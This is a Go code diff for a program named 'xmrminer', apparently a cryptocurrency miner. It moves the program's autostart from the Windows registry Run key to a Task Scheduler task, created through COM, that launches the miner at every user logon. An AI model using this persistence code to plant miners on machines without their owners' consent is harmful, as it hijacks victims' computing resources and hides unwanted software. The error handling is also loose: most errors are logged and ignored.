@@ -12,7 +12,8 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
-	"golang.org/x/sys/windows/registry"
+	"github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
 //	"os/user"
 // 	"os/signal"
 )
@@ -174,21 +175,82 @@ func autostart() {
 		return
 	}
 
-	// Open the registry key for the current user's autostart programs
-	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	ole.CoInitialize(0)
+	defer ole.CoUninitialize()
+
+	unknown, err := oleutil.CreateObject("Schedule.Service")
 	if err != nil {
-		log.Println("Error opening registry key:", err)
-		return
+		log.Println(err)
 	}
 
-	// Add the program to the autostart programs
-	err = key.SetStringValue("xmrminer", exePath)
+	defer unknown.Release()
+
+	scheduler, err := unknown.QueryInterface(ole.IID_IDispatch)
 	if err != nil {
-		log.Println("Error adding program to autostart:", err)
-		return
+		log.Println(err)
 	}
 
-	log.Println("Program added to autostart successfully.")
+	defer scheduler.Release()
+
+	taskDefinition, err := oleutil.CallMethod(scheduler, "NewTask", 0, "")
+	if err != nil {
+		log.Println(err)
+	}
+
+	defer taskDefinition.Clear()
+
+	taskDefinitionDisp := taskDefinition.ToIDispatch()
+
+	defer taskDefinitionDisp.Release()
+	_, err = oleutil.PutProperty(taskDefinitionDisp, "RegistrationInfo.Author", "Mikołaj Lubiak")
+	if err != nil {
+		log.Println(err)
+	}
+
+	_, err = oleutil.PutProperty(taskDefinitionDisp, "RegistrationInfo.Description", "Start the program at user login")
+	if err != nil {
+		log.Println(err)
+	}
+
+	// Set the trigger to start at login
+	triggersDisp := oleutil.MustCallMethod(taskDefinitionDisp, "Triggers").ToIDispatch()
+
+	defer triggersDisp.Release()
+
+	triggerDisp := oleutil.MustCallMethod(triggersDisp, "Create", 9).ToIDispatch()
+
+	defer triggerDisp.Release()
+
+	_, err = oleutil.PutProperty(triggerDisp, "StartBoundary", "2010-01-01T00:00:00")
+	if err != nil {
+		log.Println(err)
+	}
+
+	_, err = oleutil.PutProperty(triggerDisp, "Enabled", true)
+	if err != nil {
+		log.Println(err)
+	}
+
+	actionsDisp := oleutil.MustCallMethod(taskDefinitionDisp, "Actions").ToIDispatch()
+
+	defer actionsDisp.Release()
+
+	actionDisp := oleutil.MustCallMethod(actionsDisp, "Create", 0).ToIDispatch()
+
+	defer actionDisp.Release()
+
+	_, err = oleutil.PutProperty(actionDisp, "Path", exePath)
+	if err != nil {
+		log.Println(err)
+	}
+	rootFolderDisp := oleutil.MustCallMethod(scheduler, "GetFolder", "\\").ToIDispatch()
+
+	defer rootFolderDisp.Release()
+
+	_, err = oleutil.CallMethod(rootFolderDisp, "RegisterTaskDefinition", "xmrminer", taskDefinitionDisp, 6, "", "", 2, nil)
+	if err != nil {
+		log.Println(err)
+	}
 }
 
 
